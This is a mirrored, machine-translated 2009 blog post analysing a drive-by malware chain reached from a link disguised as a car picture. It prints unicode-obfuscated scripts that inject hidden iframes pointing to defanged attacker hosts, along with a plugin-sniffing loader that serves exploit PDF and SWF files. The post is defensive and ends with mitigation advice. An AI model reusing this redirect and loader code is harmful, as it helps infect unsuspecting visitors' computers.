<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>New-old pdf exploit</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ps2: There is no virus in this topic, although ‚ÄúAvastu‚Äù may seem different (thanks to edio ) 

 It all started with an innocent message in icq from my...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>New-old pdf exploit</h1><div class="post__text post__text-html js-mediator-article">  <i>ps2: There is no virus in this topic, although ‚ÄúAvastu‚Äù may seem different (thanks to <a href="https://habrahabr.ru/users/edio/" class="user_link">edio</a> )</i> <br><br>  It all started with an innocent message in icq from my good friend: <br><blockquote>  07/31/2009 18:45:11 <i>xyz</i> : see hxxp: //watnhome.com/images/car.gif :) </blockquote><br>  Like nothing suspicious.  Well, I think, I will come.  There render some BMW.  All in all, quite enjoyable.  The picture has already been loaded, and the page load indicator did not end there ... it worked for me like a disturbing bell.  I immediately poked Esc, after which Ognelis stopped the download in the tab.  With the thought that it is necessary to understand, I (from something) decided to look at the source code of the picture.  In theory, there should have been some kind of nonsense, as in any gif-jpeg image, BUT!  The reality was much more interesting. <a name="habracut"></a>  So, we look at the source image in the browser: <br><blockquote><code>view-source:hxxp://watnhome.com/images/car.gif</code> </blockquote> <br>  Wow!  Yes, it's not a picture at all. <br><blockquote> <code><font color="black"><font color="#0000ff">&lt;</font> <font color="#800000">img</font> <font color="#ff0000">src</font> <font color="#0000ff">="WorleyVision5.jpg"</font> <font color="#0000ff">&gt;</font> <br> <font color="#0000ff">&lt;</font> <font color="#800000">script</font> <font color="#ff0000">type</font> <font color="#0000ff">="text/javascript"</font> <font color="#ff0000">src</font> <font color="#0000ff">="js.js"</font> <font color="#0000ff">&gt;&lt;/</font> <font color="#800000">script</font> <font color="#0000ff">&gt;</font></font></code> </blockquote> <br>  So, I wonder what's in javascript? <br>  We look! <br><blockquote> <code>view-source:hxxp://watnhome.com/images/js.js</code> </blockquote>  There is a light nonsense: <br><blockquote> <code><font color="black"><font color="#0000ff">document</font> .write( <font color="#A31515">'\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u006c\u0069\u0073\u0074\u0065\u006e\u007a\u002e\u006f\u0072\u0067\u002f\u0073\u0074\u0061\u0074\u0073\u002f\u0072\u0075\u0031\u002e\u0070\u0068\u0070\u0022\u0020\u0073\u0074\u0079\u006c\u0065\u003d\u0022\u0064\u0069\u0073\u0070\u006c\u0061\u0079\u003a\u006e\u006f\u006e\u0065\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e'</font> )</font></code> </blockquote>  Or, translating into a more readable look ... <br><blockquote> <code><font color="black"><font color="#0000ff">document</font> .write( <font color="#A31515">'&lt;iframe src="hxxp://listenz.org/stats/ru1.php" style="display:none"&gt;&lt;/iframe&gt;'</font> )</font></code> </blockquote> <br><br>  Redirect.  Well, not to get used, we go on a chain further: <br><blockquote> <code>view-source:hxxp://listenz.org/stats/ru1.php</code> </blockquote>  Yeah, hello from the same author: <br><blockquote> <code><font color="black">&lt;script type= <font color="#A31515">"text/javascript"</font> &gt; <font color="#0000ff">document</font> .write( <font color="#A31515">'\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0076\u0065\u0072\u0069\u0076\u0065\u006c\u006c\u002e\u0063\u006f\u006d\u002f\u0075\u0070\u0064\u002f\u0069\u006e\u0064\u0065\u0078\u002e\u0070\u0068\u0070\u0022\u0020\u0073\u0074\u0079\u006c\u0065\u003d\u0022\u0064\u0069\u0073\u0070\u006c\u0061\u0079\u003a\u006e\u006f\u006e\u0065\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e'</font> )&lt;/script&gt;</font></code> </blockquote>  or a little more readable ... <br><blockquote> <code><font color="black">&lt;script type= <font color="#A31515">"text/javascript"</font> &gt; <font color="#0000ff">document</font> .write( <font color="#A31515">'&lt;iframe src="hxxp://verivell.com/upd/index.php" style="display:none"&gt;&lt;/iframe&gt;'</font> )&lt;/script&gt;</font></code> </blockquote> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      This is the end of the malicious chain: <br><blockquote> <code>view-source:hxxp://verivell.com/upd/index.php</code> </blockquote> <blockquote> <code><a href="http://virtser.net/blog/post/source-code-highlighter.aspx"></a> <font color="black">&lt;script&gt; <br> <font color="#0000ff">function</font> PDF_SWF_Iframe(sCn) <br> { <br> <font color="#0000ff">document</font> .write(sCn); <br> } <br> <br> <font color="#0000ff">if</font> (navigator.userAgent.indexOf( <font color="#A31515">'MSIE'</font> ) != -1) <br> { <br> PDF = <font color="#0000ff">new</font> Array( <font color="#A31515">'AcroPDF.PDF'</font> , <font color="#A31515">'PDF.PdfCtrl'</font> ); <br> <font color="#0000ff">for</font> (i <font color="#0000ff">in</font> PDF) <br> { <br> <font color="#0000ff">try</font> <br> { <br> obj = <font color="#0000ff">new</font> ActiveXObject(PDF[i]); <br> <br> <font color="#0000ff">if</font> (obj) <br> { <br> PDF_SWF_Iframe( <font color="#A31515">'&lt;iframe src=evenLike.pdf&gt;&lt;/iframe&gt;'</font> ); <br> } <br> } <br> <br> <font color="#0000ff">catch</font> (e){} <br> } <br> <br> <font color="#0000ff">try</font> <br> { <br> obj = <font color="#0000ff">new</font> ActiveXObject( <font color="#A31515">'ShockwaveFlash.ShockwaveFlash'</font> ); <br> <br> <font color="#0000ff">if</font> (obj) <br> { <br> PDF_SWF_Iframe( <font color="#A31515">'&lt;iframe src=normalDummyBelief.swf&gt;&lt;/iframe&gt;'</font> ); <br> } <br> } <br> <font color="#0000ff">catch</font> (e){} <br> } <br> <br> <font color="#0000ff">else</font> <br> { <br> <font color="#0000ff">for</font> (i = 0; i &lt;= navigator.plugins.length; i++) <br> { <br> <font color="#0000ff">var</font> plugin = navigator.plugins[i].name; <br> <br> <font color="#0000ff">if</font> ((plugin.indexOf( <font color="#A31515">'Adobe Acrobat'</font> ) != -1) || (plugin.indexOf( <font color="#A31515">'Adobe PDF'</font> ) != -1)) <br> { <br> PDF_SWF_Iframe( <font color="#A31515">'&lt;iframe src=evenLike.pdf&gt;&lt;/iframe&gt;'</font> ); <br> } <br> <br> <font color="#0000ff">if</font> (plugin.indexOf( <font color="#A31515">'Flash'</font> ) != -1) <br> { <br> PDF_SWF_Iframe( <font color="#A31515">'&lt;iframe src=normalDummyBelief.swf&gt;&lt;/iframe&gt;'</font> ); <br> } <br> } <br> } <br> &lt;/script&gt;</font> <br> <br> <font color="gray">* This source code was highlighted with <font color="gray">Source Code Highlighter</font> .</font></code> </blockquote> <br>  That is, welcome to the pdf computer <i>(evenLike.pdf is infected with Exploit.Win32.Pidief.bfz)</i> and swf, our most favorite friends.  I did not begin to disassemble further: these script and documents exploit a <a href="http://secunia.com/advisories/35948/" title="Secunia Advisory: SA35948">fresh July</a> vulnerability ( <a href="http://habrahabr.ru/blogs/infosecurity/65272/">topic on Habr√©</a> ), the <a href="http://secunia.com/advisories/33901/" title="Secunia Advisory: SA33901">February one</a> , and maybe even the older one.  If you remember, at one time there was a link to the ‚Äúviral video‚Äù on the Alfastrach website, which, as <a href="http://www.securitylab.ru/news/363717.php">it turned out, was viral without quotes</a> , because it was put on the user's computer Trojan-Spy.Win32.Zbot.gkj. <br><br>  Want to play?  You can easily download these documents to yourself, and see what each of them is doing.  If this is not enough, then there is <a href="http://www.milw0rm.com/exploits/9233">another "example"</a> , but the author warns that 'This virus is srs business!'  (‚ÄúThis virus is a serious business‚Äù). <br><br>  So, in conjunction with <a href="http://techbytesdaily.com/2009/07/23/disable-pdf-browser-integration-to-mitigate-adobe-security-flaws/">TechBytesDaily,</a> I urge you to turn off the pdf display in the browser window, no matter how convenient it may seem.  Always save pdf documents, and whenever possible, use the free, not-so-hover counterparts of Adobe Acrobat (like Foxit Reader, Sumatra PDF).  Unfortunately, the plugin from Adobe does not adequately filter the received content before giving it to show it to the user in the browser. <br><br>  And once again about security: be attentive to incomprehensible messages even from well-known people, especially if it contains a link to an unknown resource and there is no personal comment from the author. <br><br>  <b>ps</b> In http links to hxxp fixed by me specifically. </div><p>Source: <a href="https://habr.com/ru/post/65927/">https://habr.com/ru/post/65927/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../65918/index.html">All-Russian Saturday of donors - I am outraged!</a></li>
<li><a href="../65920/index.html">iPhone 3.0.1</a></li>
<li><a href="../65922/index.html">Toolkit: NBehave</a></li>
<li><a href="../65924/index.html">Terrible and terrible SORM2: a bit of practice</a></li>
<li><a href="../65925/index.html">Made at 95%</a></li>
<li><a href="../65930/index.html">We optimize the download of the ExtJS library to two queries</a></li>
<li><a href="../65933/index.html">How to ‚Äúget rid‚Äù of advertising links to Gmail ?!</a></li>
<li><a href="../65935/index.html">‚ÄúCheap‚Äù brutal fusion reactor</a></li>
<li><a href="../65936/index.html">Theories of motivation</a></li>
<li><a href="../65937/index.html">Supercomputers in Russia - catch up and overtake?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>